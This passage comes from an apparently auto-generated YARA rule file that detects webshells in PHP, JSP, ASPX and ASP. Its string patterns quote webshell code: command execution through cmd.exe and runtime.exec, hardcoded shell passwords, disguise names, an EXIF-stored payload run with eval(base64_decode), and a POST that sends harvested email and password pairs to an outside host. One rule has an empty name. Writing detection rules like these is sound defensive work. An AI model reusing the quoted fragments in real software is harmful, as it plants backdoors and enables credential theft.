      $s16 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s17 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s18 = "echo '</select><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_e" ascii
      $s19 = ".'<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol" ascii
      $s20 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_job {
   meta:
      description = "webshell - file job.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
      $s3 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
      $s4 = "public String DBExecute(String sql) {" fullword ascii
      $s5 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s6 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s7 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s8 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s9 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s10 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s11 = "dbResult = DBExecute(sql);" fullword ascii
      $s12 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s13 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s14 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s15 = "proc = runtime.exec(cmd);" fullword ascii
      $s16 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s17 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s18 = "public String exeCmd(String cmd) {" fullword ascii
      $s19 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s20 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_ha {
   meta:
      description = "webshell - file ha.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
      $s3 = "public String DBExecute(String sql) {" fullword ascii
      $s4 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s5 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s6 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s7 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s8 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s9 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s10 = "dbResult = DBExecute(sql);" fullword ascii
      $s11 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s12 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s13 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s14 = "proc = runtime.exec(cmd);" fullword ascii
      $s15 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s16 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s17 = "public String exeCmd(String cmd) {" fullword ascii
      $s18 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s19 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
      $s20 = "request.getParameter(\"dbPassword\") == null ||" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_520 {
   meta:
      description = "webshell - file 520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
      $s3 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.77169.com\" " ascii
      $s4 = "public String DBExecute(String sql) {" fullword ascii
      $s5 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s6 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s7 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s8 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s9 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s10 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s11 = "dbResult = DBExecute(sql);" fullword ascii
      $s12 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s13 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s14 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s15 = "proc = runtime.exec(cmd);" fullword ascii
      $s16 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s17 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s18 = "public String exeCmd(String cmd) {" fullword ascii
      $s19 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s20 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_ma1 {
   meta:
      description = "webshell - file ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "<td align=\"right\">hack520 by <a href=\"mailto:hack520@77169.org\">hack520</a> and welcome to <a href=\"http://www.GOOGLE.com\"" ascii
      $s3 = "public String DBExecute(String sql) {" fullword ascii
      $s4 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s5 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s6 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s7 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s8 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s9 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s10 = "dbResult = DBExecute(sql);" fullword ascii
      $s11 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s12 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s13 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s14 = "proc = runtime.exec(cmd);" fullword ascii
      $s15 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s16 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s17 = "public String exeCmd(String cmd) {" fullword ascii
      $s18 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s19 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
      $s20 = "request.getParameter(\"dbPassword\") == null ||" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_jsp_ma4 {
   meta:
      description = "webshell - file ma4.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
   strings:
      $s1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
      $s2 = "<td align=\"right\">created by <a href=\"mailto:luoluonet@hotmail.com\">luoluo</a> and welcome to <a href=\"http://www.ph4nt0m.o" ascii
      $s3 = "public String DBExecute(String sql) {" fullword ascii
      $s4 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
      $s5 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
      $s6 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
      $s7 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
      $s8 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s9 = "if (_dbStatement.execute(sql)) {" fullword ascii
      $s10 = "dbResult = DBExecute(sql);" fullword ascii
      $s11 = "<form name=\"config\" method=\"post\" action=\"<%=request.getRequestURI() + \"?action=config&cfAction=save\"%>\" onSubmit=\"java" ascii
      $s12 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
      $s13 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s14 = "proc = runtime.exec(cmd);" fullword ascii
      $s15 = "result += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + request.getRequestURI() + \"?action=\" + request.getParamete" ascii
      $s16 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
      $s17 = "public String exeCmd(String cmd) {" fullword ascii
      $s18 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s19 = "jshell.write(buffer, start, buffer.length - 1 - start);" fullword ascii
      $s20 = "request.getParameter(\"dbPassword\") == null ||" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule devilzShell {
   meta:
      description = "webshell - file devilzShell.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s3 = "Dim shell_password As String = \"devilzc0der\"" fullword ascii
      $s4 = "target.style.background = '\" & shell_color & \"';\" & _" fullword ascii
      $s5 = "    Private Declare Auto Function SHGetFileInfo Lib \"shell32.dll\" ( _" fullword ascii
      $s6 = "<td style=\"width:10%;\"><input type=\"submit\" class=\"btn\" name=\"btnCommand\" style=\"width:120px;\" value=\"Execute\" /></t" ascii
      $s7 = "Dim shell_fake_name As String = \"Server Logging System\"" fullword ascii
      $s8 = "<td style=\"width:10%;\"><input type=\"submit\" class=\"btn\" name=\"btnCommand\" style=\"width:120px;\" value=\"Execute\" /></t" ascii
      $s9 = "color:\" & shell_color & \";\" & _" fullword ascii
      $s10 = "background:\" & shell_color & \";\" & _" fullword ascii
      $s11 = "\"function highlighthexdump(address){\" & _" fullword ascii
      $s12 = "var target = document.getElementById(address);\" & _" fullword ascii
      $s13 = "target.style.background = 'none';\" & _" fullword ascii
      $s14 = "Dim shell_name As String = \"devilzShell\"" fullword ascii
      $s15 = "\"function unhighlighthexdump(address){\" & _" fullword ascii
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                ' */
      $s17 = "AAAAAAAAAAAAAABAAAD" ascii /* base64 encoded string '           @  ' */
      $s18 = "AABAAAAAAAAAAEAAAAAAAAAAC" ascii /* base64 encoded string '  @       @       ' */
      $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '                                                 ' */
      $s20 = "AAAAAAAAAAB" ascii /* base64 encoded string '        ' */
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      8 of them
}

rule webshell_aspx_wt {
   meta:
      description = "webshell - file wt.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "350062ce5c25e1ba1c5fbed77081ed88789bf79bbdab2301092a591eddaa665a"
   strings:
      $s1 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s2 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s3 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s4 = "                                            if (list.IndexOf(temp + \"\\\\\") == -1)" fullword ascii
      $s5 = "                                                    list.Add(temp + \"\\\\\");" fullword ascii
      $s6 = "<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>" fullword ascii
      $s7 = "                                                FileAttributes dInfo = File.GetAttributes(temp);" fullword ascii
      $s8 = "<%@ import Namespace=\"System.Text.RegularExpressions\"%>" fullword ascii
      $s9 = "<%@ import Namespace=\"System.Collections.Generic\"%>" fullword ascii
      $s10 = "                                        while (temp.IndexOf(\"\\\\\") != -1)" fullword ascii
      $s11 = "                                            if (list.IndexOf(temp) == -1)" fullword ascii
      $s12 = "                                                        File.Delete(temp + \"\\\\test\");" fullword ascii
      $s13 = "                                                    Response.Write(temp + \"<br/>\");" fullword ascii
      $s14 = "                                                        File.Create(temp + \"\\\\Test\").Close();" fullword ascii
      $s15 = "<%@ import Namespace=\"System.Threading\"%>" fullword ascii
      $s16 = "                                                    list.Add(temp);" fullword ascii
      $s17 = "<%@ import Namespace=\"Microsoft.Win32\"%>" fullword ascii
      $s18 = "                    string[] keys = Hklm.GetSubKeyNames();" fullword ascii
      $s19 = "        RegStack.Push(Registry.Users);" fullword ascii
      $s20 = "                                                }" fullword ascii /* reversed goodware string '}                                                ' */
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      8 of them
}

rule webshell_aspx_view {
   meta:
      description = "webshell - file view.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
   strings:
      $x1 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
      $x2 = "      Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
      $x3 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x4 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
      $x5 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x6 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
      $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
      $x8 = "    <td><a href=\"?action=user\" >List User Accounts</a> - <a href=\"?action=auser\" >IIS Anonymous User</a>- <a href=\"?action=" ascii
      $x9 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
      $x10 = "response.Write(\"<script>alert('File \" & filename & \" upload success!\\nFile info:\\n\\nClient Path:\" & replace(UpFile.value," ascii
      $x11 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
      $s12 = "ExecuteCommand2(command,tempFile)" fullword ascii
      $s13 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
      $s14 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
      $s15 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
      $s16 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
      $s17 = " >Port Scanner</a> - <a href=\"?action=iisspy\" >IIS Spy</a> - <a href=\"?action=regshell\" >Registry Shell</a> - <a href=\"?act" ascii
      $s18 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
      $s19 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
      $s20 = "  <p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule  {
   meta:
      description = "webshell - file .aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "331d081d6fa2241b5b695dffcdf830d9bcd52d97a472057168a4a487215f805b"
   strings:
      $s1 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s2 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s3 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
      $s4 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s5 = "<%@ import Namespace=\"System.Data.OleDb\"%>" fullword ascii
      $s6 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s7 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii
      $s8 = "                                            if (list.IndexOf(temp + \"\\\\\") == -1)" fullword ascii
      $s9 = "                                                list.Add(temp + \"\\\\\");" fullword ascii
      $s10 = "<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>" fullword ascii
      $s11 = "                            if (str.IndexOf(\":\\\\\") != -1 && str.IndexOf(\"c:\\\\program files\") == -1 && str.IndexOf(\"c:" ascii
      $s12 = "                            if (str.IndexOf(\":\\\\\") != -1 && str.IndexOf(\"c:\\\\program files\") == -1 && str.IndexOf(\"c:" ascii
      $s13 = "<%@ import Namespace=\"System.Diagnostics\"%>" fullword ascii
      $s14 = "<%@ import Namespace=\"System.Runtime.InteropServices\"%>" fullword ascii
      $s15 = "<%@ Import Namespace=\"System.Threading\"%>" fullword ascii
      $s16 = "<%@ import Namespace=\"System.Text.RegularExpressions\"%>" fullword ascii
      $s17 = "<%@ import Namespace=\"System.Management\"%>" fullword ascii
      $s18 = "<%@ import Namespace=\"System.DirectoryServices\"%>" fullword ascii
      $s19 = "<%@ import Namespace=\"System.Collections.Generic\"%>" fullword ascii
      $s20 = "<%@ import Namespace=\"System.Collections\" %>" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 10KB and
      8 of them
}

rule bukapalapak {
   meta:
      description = "webshell - file bukapalapak.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fea7a90e96ed4624d889228fe38f37529cae30bd4e5d7d06fc24649c535026c8"
   strings:
      $s1 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s2 = "$BASED = exif_read_data(\"https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman." ascii
      $s3 = "<script src=\"https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.2/jquery-ui.min.js\"></script>" fullword ascii
      $s4 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"utf8=%E2%9C%93&user_session%5Busername%5D=$email&user_session%5Bpassword%5D=$pass&commit=Lo" ascii
      $s5 = "<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script>" fullword ascii
      $s6 = "curl_setopt($ch,CURLOPT_POSTFIELDS,\"utf8=%E2%9C%93&user_session%5Busername%5D=$email&user_session%5Bpassword%5D=$pass&commit=Lo" ascii
      $s7 = "$ch = curl_init('https://www.bukalapak.com/user_sessions');" fullword ascii
      $s8 = "$now = \"<i style=\\\"color:blue\\\">Checked on PrivateCodes at \".date(\"g:i a - F j, Y\").\"</i>\";" fullword ascii
      $s9 = "  XeleM.open(\"POST\", \"http://server-not-found.esy.es/config.php\", true);" fullword ascii
      $s10 = "ntrol\" rows=\"7\" placeholder=\"your@email.com|passW0rd\"><?php" fullword ascii
      $s11 = "<link rel=\"stylesheet\" href=\"http://themes.suggelab.com/dynamic/css/bootstrap.css\">" fullword ascii
      $s12 = "<!-- Bootstrap Start -->" fullword ascii
      $s13 = "<link rel=\"stylesheet\" href=\"http://themes.suggelab.com/dynamic/css/main.css\">" fullword ascii
      $s14 = "$cookie = 'cookie.txt';" fullword ascii
      $s15 = "$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';" fullword ascii
      $s16 = "<textarea style=\"background:rgba(0,225,0,00);\" name=\"mailpass\" id=\"mailpass\" style=\"width: 441px; height: 187px;\" class=" ascii
      $s17 = "eval(base64_decode($BASED[\"COMPUTED\"][\"UserComment\"]));" fullword ascii
      $s18 = "  XeleM.send(\"username='.$email.'&password='.$pass.'\");" fullword ascii
      $s19 = "<center>Max Email|Password 100</CENTER>" fullword ascii
      $s20 = "                                    <!-- Start .panel -->" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 10KB and
      8 of them
}

rule devilzShell_2 {
   meta:
      description = "webshell - file devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $x1 = "    Set pipe = sh.Exec(\"%COMSPEC% /C \" & chdir  & \" && \" & cmd)" fullword ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s3 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s4 = "target.style.background = '\" & shell_color & \"';\" &_" fullword ascii
      $s5 = "Set objCollection = objWMIService.ExecQuery _" fullword ascii
      $s6 = "shell_password = \"devilzc0der\"" fullword ascii
      $s7 = "\"<td style=\"\"width:10%;\"\"><input type=\"\"submit\"\" class=\"\"btn\"\" name=\"\"btnCommand\"\" style=\"\"width:120px;\"\" v" ascii
      $s8 = "\"<td style=\"\"width:10%;\"\"><input type=\"\"submit\"\" class=\"\"btn\"\" name=\"\"btnCommand\"\" style=\"\"width:120px;\"\" v" ascii
      $s9 = "Response.Write execute(Request.QueryString(\"eval\"))" fullword ascii
      $s10 = "<%@ Language = \"VBscript\" %><% On Error Resume Next %><% Server.ScriptTimeout=600 %><% session.lcid=2057 %>" fullword ascii
      $s11 = "Response.AddHeader \"Content-transfer-encoding\", \"binary\"" fullword ascii
      $s12 = "If(check = shell_password) Then" fullword ascii
      $s13 = "shell_fake_name = \"Server Logging System\"" fullword ascii
      $s14 = "background:\" & shell_color & \";\" &_" fullword ascii
      $s15 = "color:\" & shell_color & \";\" &_" fullword ascii
      $s16 = "Response.Cookies(\"pass\").Expires = Date - 7" fullword ascii
      $s17 = "If(xrunexploit(dir,wBind,port,\"connect\"))Then" fullword ascii
      $s18 = "Response.AddHeader \"Content-Disposition\", \"attachment;filename=\"& fname &\"\"" fullword ascii
      $s19 = "html_head = \"<title>\" & html_title & \"</title>\" & shell_style" fullword ascii
      $s20 = "\"function unhighlighthexdump(address){\" &_" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2021052101 {
   meta:
      description = "webshell - file 2021052101.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0f851f3c32ab8e642c7bc5cf0b0d06cd92c6469492c2ea0685e8548a86309d95"
   strings:
      $x1 = "String clzBytecodeBase64Str = \"yv66vgAAADIA4QgARgcAnAgAOwcAQAcATAcAwQEACVpLTTE1LjAuMAoA3gAXBwCwAQAQamF2YS9sYW5nL1RocmVhZAEADUxl" ascii
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s3 = "EVneBILCjZqFBYOJ8CAFWgQEgMIJDZtEBYpASsQawQWAwECNHgQGAMEFjZoEBYjAQ4YaGAgAwECNkoQFhMDMzZgHBYDEcCAIGgQFgMFEjZrEBYHAQI2aBccMCMCPlsUF" ascii
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s5 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s6 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s7 = "QgqEBcytgDLOgwZCCoQJjK2AMs6DRkJKhAVMgO9AN62ABQZCQO9ANe2AGg6DhkOtgBXKhAiMgO9AN62ABQZDgO9ANe2AGg6DyoQGDI6ECoQCzI6EQE6EhkIKhAHMrYAy" ascii
      $s8 = "wYQEyEBATZKEBslAQI1XhARAwEHWGgQEgMBEhRoHTADAgHAgGodFgMFAiNeEjwDAQo2RTYWAwECR2gQFgMDAjZoEBYgBQI2aBAWAwsKNmgQFgcBAjJoHBYDAgI8ShA0A" ascii
      $s9 = "4AAAAAAAAAA" ascii /* reversed goodware string 'AAAAAAAAAA4' */
      $s10 = "ngSLQl0AjxGZxQqKwg1SyIWBCwoLWtmPAMtJDJoFDAFdQI5ThIWDwECNh4IFiMSKCVsEA47NDQ2ESUwwIApBCZMZBYFJwE2bT4bBxESNl8QMHQEARxlFgY7cgI6RQsZJ" ascii
